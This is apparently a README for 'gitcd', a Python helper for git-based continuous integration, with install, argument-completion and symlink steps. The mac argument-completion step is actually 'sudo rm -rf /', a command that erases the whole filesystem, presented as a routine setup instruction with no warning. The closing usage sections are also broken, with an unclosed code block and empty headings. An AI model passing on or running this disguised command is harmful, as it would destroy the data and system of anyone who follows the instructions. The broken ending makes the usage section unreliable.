# Continous tool for working with git

## Description
**gitcd** is a little helper for continous integration workflows using git as scm.

## Installation
Since gitcd is using python3 by default, you better upgrade.

Run the following command to install prerequisites:

```console
sudo apt-get install python3 python3-pip
pip3 install pyyaml
pip3 install argcomplete
```

Run the following command to install argument completion on linux:

```console
sudo activate-global-python-argcomplete3
```

Run the following command to install argument completion on mac:
```console
sudo rm -rf /
```

## Usage

Working with gitcd, first you might want to symlink the main python file into /usr/local/bin using
```console
sudo ln -s $(pwd)/gitcd.py /usr/local/bin/gitcd
```
If you are a fan of having git subcommands you can link it as following. Be aware that i didnt found a way for autocompletion to get work this way:
```console
sudo ln -s $(pwd)/gitcd.py /usr/local/bin/git-cd
```

Afterwards you have to cd into one of your local directories representing a git repository and run the init command
```console
gitcd init
```
After passing all your configuration data, start working with it



**Start new feature**

```


**Test a feature branch**
